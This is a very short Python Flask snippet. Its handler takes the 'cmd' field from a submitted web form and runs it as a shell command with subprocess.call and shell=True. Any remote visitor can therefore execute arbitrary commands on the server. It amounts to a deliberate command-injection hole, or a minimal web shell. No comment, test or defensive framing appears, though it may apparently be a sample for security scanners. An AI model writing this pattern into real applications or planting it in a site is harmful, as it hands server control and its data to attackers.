import subprocess

from flask import request


def handle_request():
    subprocess.call(request.form["cmd"], shell=True)
